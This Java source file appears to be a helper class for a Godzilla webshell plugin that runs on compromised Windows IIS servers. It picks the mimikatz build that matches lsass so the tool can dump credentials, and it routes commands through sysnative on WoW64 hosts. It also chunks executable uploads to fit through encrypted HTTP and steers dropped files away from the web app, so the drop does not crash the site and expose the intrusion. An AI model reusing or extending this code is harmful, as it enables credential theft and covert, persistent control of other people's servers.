package shells.plugins.generic;

import core.imp.Payload;

/**
 * Process arch ({@link Payload#isX64()}) is the current IIS/w3wp bitness.
 * Mimikatz/sekurlsa must match lsass, which follows the OS arch. A 32-bit
 * app pool on 64-bit Windows is WoW64 and must not pick mimikatz-32.
 */
public final class PayloadArch {

    private PayloadArch() {
    }

    public static boolean isOsX64(Payload payload) {
        if (payload == null) {
            return false;
        }
        if (payload.isX64()) {
            return true;
        }
        String os = "";
        String basics = "";
        try {
            os = payload.getOsInfo();
        } catch (Throwable ignored) {
        }
        try {
            basics = payload.getBasicsInfo();
        } catch (Throwable ignored) {
        }
        String blob = ((os == null ? "" : os) + "\n" + (basics == null ? "" : basics)).toLowerCase();
        if (blob.contains("os.arch: amd64") || blob.contains("os.arch:amd64")
                || blob.contains("os.arch: x64") || blob.contains("win64")
                || blob.contains("amd64") || blob.contains("x64-based")
                || blob.contains("64-bit") || blob.contains("64 位") || blob.contains("64位")) {
            return true;
        }
        try {
            if (payload.isWindows()) {
                if (payload.getFileSize("C:/Windows/SysWOW64/ntdll.dll") > 0) {
                    return true;
                }
                if (payload.getFileSize("C:/Windows/sysnative/ntdll.dll") > 0) {
                    return true;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    public static boolean isWow64(Payload payload) {
        return payload != null && payload.isWindows() && isOsX64(payload) && !payload.isX64();
    }

    /** Same as stock Godzilla: match the current process, not the OS. */
    public static String mimikatzAssetName(Payload payload) {
        return payload != null && payload.isX64() ? "mimikatz-64.exe" : "mimikatz-32.exe";
    }

    /** sekurlsa must match lsass (OS arch). Use after a 64-bit SYSTEM host is available. */
    public static String mimikatzAssetNameForLsass(Payload payload) {
        if (payload != null && payload.isWindows() && isOsX64(payload)) {
            return "mimikatz-64.exe";
        }
        return mimikatzAssetName(payload);
    }

    /** WoW64: System32 is redirected; sysnative reaches the real 64-bit directory. */
    public static String nativeSystem32(Payload payload, String exeFileName) {
        if (isWow64(payload)) {
            return "C:\\Windows\\sysnative\\" + exeFileName;
        }
        return "C:\\Windows\\System32\\" + exeFileName;
    }

    public static String wow64NativeCmd(Payload payload, String cmd) {
        if (cmd == null || !isWow64(payload)) {
            return cmd;
        }
        String t = cmd.trim();
        String lower = t.toLowerCase();
        if (lower.startsWith("cmd.exe")) {
            return "C:\\Windows\\sysnative\\cmd.exe" + t.substring(7);
        }
        if (lower.startsWith("cmd ") || lower.equals("cmd")) {
            return "C:\\Windows\\sysnative\\cmd.exe" + t.substring(3);
        }
        return cmd;
    }

    /** Cap PE chunks so gzip+AES+HTTP stay under common 1MB body limits. */
    public static final int PE_UPLOAD_CHUNK_CAP = 256 * 1024;

    public static int peUploadChunkSize(int onceConfigured) {
        if (onceConfigured <= 0) {
            return PE_UPLOAD_CHUNK_CAP;
        }
        return Math.min(onceConfigured, PE_UPLOAD_CHUNK_CAP);
    }

    public static String joinWinDir(String dir, String fileName) {
        if (fileName == null) {
            fileName = "";
        }
        if (dir == null || dir.trim().isEmpty()) {
            return fileName;
        }
        String d = dir.trim().replace('/', '\\');
        while (d.endsWith("\\")) {
            d = d.substring(0, d.length() - 1);
        }
        return d + "\\" + fileName;
    }

    public static String normalizeWinDir(String dir) {
        if (dir == null) {
            return "";
        }
        String d = dir.trim().replace('/', '\\');
        while (d.endsWith("\\")) {
            d = d.substring(0, d.length() - 1);
        }
        return d;
    }

    /**
     * Writing a native PE into the web app (especially bin/) recycles the
     * AppDomain. In-memory HTTP modules then vanish and web.config still
     * points at them → site-wide BadImageFormatException / YSOD.
     */
    public static boolean isWebAppDir(String dir) {
        String d = normalizeWinDir(dir).toLowerCase();
        if (d.isEmpty()) {
            return false;
        }
        if (d.endsWith("\\bin") || d.contains("\\bin\\")
                || d.contains("\\app_data") || d.contains("\\app_code")) {
            return true;
        }
        if (d.contains("\\wwwroot") || d.contains("\\inetpub")) {
            return true;
        }
        if (d.contains("\\microsoft.net\\framework") && d.contains("\\temporary asp.net files")) {
            return true;
        }
        return false;
    }

    public static boolean isUnderWinDir(String path, String parent) {
        String p = normalizeWinDir(path).toLowerCase();
        String r = normalizeWinDir(parent).toLowerCase();
        if (p.isEmpty() || r.length() < 4) {
            return false;
        }
        return p.equals(r) || p.startsWith(r + "\\");
    }

    /** Refuse any drop that sits in or under the live web app. */
    public static boolean isUnsafeDropPath(String path, String... siteRoots) {
        if (path == null || path.trim().isEmpty()) {
            return true;
        }
        if (isWebAppDir(path)) {
            return true;
        }
        if (siteRoots != null) {
            for (String root : siteRoots) {
                if (isUnderWinDir(path, root)) {
                    return true;
                }
            }
        }
        return false;
    }
}
